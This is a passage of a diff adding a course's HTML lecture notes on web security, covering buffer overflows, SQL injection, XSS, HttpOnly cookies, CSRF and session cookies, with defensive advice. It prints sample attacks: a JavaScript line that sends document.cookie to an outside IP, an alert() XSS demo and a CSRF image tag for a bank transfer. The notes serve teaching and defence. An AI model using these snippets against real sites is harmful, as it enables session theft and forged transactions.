+data sent overwrites (eventually) server code =&gt; client can run arbitrary
+code on server.</p>
+<p>In the days of C server code, this was a very common attack:</p>
+<pre class="literal-block">
+char buf[256];
+recv(buf, amount);
+</pre>
+<p>What if 'amount' is negative, or not properly calculated? =&gt; buf overflow.</p>
+<p>Bleah.</p>
+<p>Now most new networking code is written in something other than C; better
+languages (e.g. Python ;) dynamically allocate buffers.</p>
+<p>...but think about the denial of service aspect: perhaps the C route is
+better, because it won't dynamically allocate 1gb of RAM to receive!</p>
+</div>
+<div class="section">
+<h2><a id="sql-injection" name="sql-injection">SQL injection</a></h2>
+<p>SQL databases are very common esp at big companies, so specific attacks
+against them have been designed.</p>
+<img alt="exploits_of_a_mom.png" src="exploits_of_a_mom.png" style="width: 600px;" />
+<p>Malformed quoting or other &quot;games&quot; with usernames, input values, etc.</p>
+<p>That's why you <em>always</em> use placeholders ('?') in your SQL queries.</p>
+<p>Remember, user input is <em>dirty</em>.  <em>Sanitize it</em>.</p>
+</div>
+<div class="section">
+<h2><a id="xss-cross-site-scripting" name="xss-cross-site-scripting">XSS: Cross-Site Scripting</a></h2>
+<p>(a.k.a. &quot;HTML injection&quot;)</p>
+<p>If attackers can inject arbitrary HTML into your browser, including
+HTML containing valid JavaScript, then attackers can control your
+browser.</p>
+<p>For example, unquoted posts in message boards or error message display
+allow you to &quot;take over&quot; a browser.</p>
+<p>Works within &quot;same-origin&quot; policy sandbox: JavaScript originates from same site
+that sent pages &amp; cookies, so the JS can load pages, manipulate cookies,
+etc.</p>
+<p>(Demo with</p>
+<pre class="literal-block">
+&lt;script type='text/javascript'&gt;alert('fiz');&lt;/script&gt;
+</pre>
+<p>You can use the <tt class="docutils literal"><span class="pre">|e</span></tt> filter in Jinja2 templating to escape messages, though!</p>
+<p>Again, user input is <em>dirty</em>.  <em>Sanitize it</em>.</p>
+<p>The real problem with XSS is that it bypasses the JavaScript security
+model, in which JavaScript can only access items (cookies, URLs). In
+the XSS case, <em>your</em> site (the meep message board, for example) is the
+one serving the JS even though a malicious Evil Canadian Hacker is the
+one writing it.</p>
+</div>
+<div class="section">
+<h2><a id="xss-and-httponly-protecting-the-cookie-jar" name="xss-and-httponly-protecting-the-cookie-jar">XSS and HttpOnly: Protecting the Cookie Jar</a></h2>
+<p>Can mark your cookies as inaccessible to JavaScript with HttpOnly:</p>
+<pre class="literal-block">
+Set-Cookie: ASP.NET_SessionId=ig2fac55; path=/; HttpOnly
+</pre>
+<p>This protects against a specific class of attacks that sends your
+cookies to another URL with a JS redirect:</p>
+<pre class="literal-block">
+window.location=&quot;http://1.2.3.4:81/r.php?u=&quot;
++document.links[1].text
++&quot;&amp;l=&quot;+document.links[1]
++&quot;&amp;c=&quot;+document.cookie;
+</pre>
+<p>Browser support is still spotty (e.g. FF doesn't entirely work).</p>
+<p>Only protects against a particularly <em>easy</em> set of XSS attacks...</p>
+</div>
+<div class="section">
+<h2><a id="xsrf-cross-site-request-forgeries" name="xsrf-cross-site-request-forgeries">XSRF: Cross-Site Request Forgeries</a></h2>
+<blockquote>
+<p>CSRF vulnerabilities occur when a website allows an authenticated
+user to perform a sensitive action but does not verify that the
+user herself is invoking that action. The key to understanding CSRF
+attacks is to recognize that websites typically don't verify that a
+request came from an authorized user. Instead they verify only that
+the request came from the browser of an authorized user. Because
+browsers run code sent by multiple sites, there is a danger that
+one site will (unbeknownst to the user) send a request to a second
+site, and the second site will mistakenly think that the user
+authorized the request.</p>
+<blockquote>
+-- Bill Zeller</blockquote>
+</blockquote>
+<p>Take advantage of stateful mechanisms in browsers designed to help
+&quot;chain&quot; multiple requests, like your message delete mechanism.
+Basically, POST directly to another URL.</p>
+<p>e.g. for meep, read</p>
+<blockquote>
+<a class="reference" href="http://class.ged.idyll.org/svn/files/hw10/solutions/meep_example_app.py">http://class.ged.idyll.org/svn/files/hw10/solutions/meep_example_app.py</a></blockquote>
+<p>and now imagine what happens when you do</p>
+<pre class="literal-block">
+GET /m/del_action?del_message=1
+</pre>
+<p>If you're logged into your meep site, and then another site has the
+above link to the first site (or malicious XSS/JavaScript redirecting
+you to that URL) you will delete message #1!</p>
+<p>Annoying -- now imagine</p>
+<blockquote>
+&lt;img src=&quot;<a class="reference" href="http://foobank.com/transfer_money?src_account=checking&amp;...&amp;confirm=yes">http://foobank.com/transfer_money?src_account=checking&amp;...&amp;confirm=yes</a>&quot;&gt;</blockquote>
+<p>Attack model:</p>
+<blockquote>
+<ul class="simple">
+<li>you're logged into your bank in one tab/window, or have a login cookie</li>
+<li>you go to another site run by the Evil Canadian Hackers</li>
+<li>ECH site builds a URL (either within a form or with JavaScript)
+confirming a bank transfer into ECH's bank account (or an e-bay
+purchase, or a paypal transaction...)</li>
+<li>ECH site gives you this URL to load (with JS, image link, etc.)</li>
+</ul>
+</blockquote>
+<p>With JS or image URLs or ..., you may not even know that the attack is
+taking place!</p>
+<p>Why does this vulnerability exist?  Chaining forms, for example.</p>
+<p>Protection mechanisms:</p>
+<blockquote>
+<ul class="simple">
+<li>check HTTP referrer (which can break for other reasons).</li>
+<li>Secret, hidden, dynamically generated form value on all your forms.</li>
+<li>Inject your site cookies into your forms with JavaScript, and then
+compare browser cookies with form values received.  This ensures that
+the author of the forms had direct access to the cookie information.</li>
+</ul>
+</blockquote>
+<p>And again, user input (URLs) is <em>dirty</em>... etc.</p>
+</div>
+<div class="section">
+<h2><a id="cookies-and-sessions" name="cookies-and-sessions">Cookies and sessions</a></h2>
+<p>I'm sure you've noticed that the browser can send whatever cookie it
+wants.  So, for your meep stuff, you can become whatever user you want.
+How do you protected against this?</p>
+<p>Have the <em>server</em> generate a large random number (see uuid &amp; homework #12)
+and set that as the cookie; and then associate the cookie with the user
+on the server side.</p>
+<p>This means that Evil Candian Hackers have to guess a large random
+number properly in order to gain access to your account.  (And it's
+probably easier to guess your password...)</p>
+<p>Now, link that cookie to the IP address from which the user logs in,
+and it's even more secure.</p>
+</div>
+</div>
+<div class="section">
+<h1><a id="two-principles-for-thinking-securely-about-security" name="two-principles-for-thinking-securely-about-security">Two principles for thinking securely about security</a></h1>
+<blockquote>
+<ol class="arabic simple">
+<li>Do you follow the rule that all input is evil until proven otherwise?</li>
+<li>Can you detect a man-in-the-middle attack?</li>
+</ol>
+</blockquote>
+<p>#1 is up to you.</p>
+<p>#2 is architectural: the Web is vulnerable to certain
+man-in-the-middle attacks, but if you use HTTPS you're probably as
+good as most banks.</p>
+<p>Either way, remember: the devil is in the details.  KISS so that at least
+flaws will be obvious to everyone!</p>
+</div>
+<div class="section">
+<h1><a id="references" name="references">References</a></h1>
+<p>MiG-in-the-middle attack - use Google.</p>
+<p>RSA encryption algorithm:</p>
+<blockquote>
+<a class="reference" href="http://en.wikipedia.org/wiki/RSA">http://en.wikipedia.org/wiki/RSA</a></blockquote>
+<p>Cross-site scripting:</p>
+<blockquote>
+<a class="reference" href="http://en.wikipedia.org/wiki/Cross-site_scripting">http://en.wikipedia.org/wiki/Cross-site_scripting</a></blockquote>
+<p>Cross-Site Request Forgeries and You:</p>
+<blockquote>
+<a class="reference" href="http://www.codinghorror.com/blog/archives/001171.html">http://www.codinghorror.com/blog/archives/001171.html</a></blockquote>
+<p>HttpOnly cookies:</p>
+<blockquote>
+<a class="reference" href="http://www.codinghorror.com/blog/archives/001167.html">http://www.codinghorror.com/blog/archives/001167.html</a></blockquote>
+</div>
+</div>
+</body>
+</html>
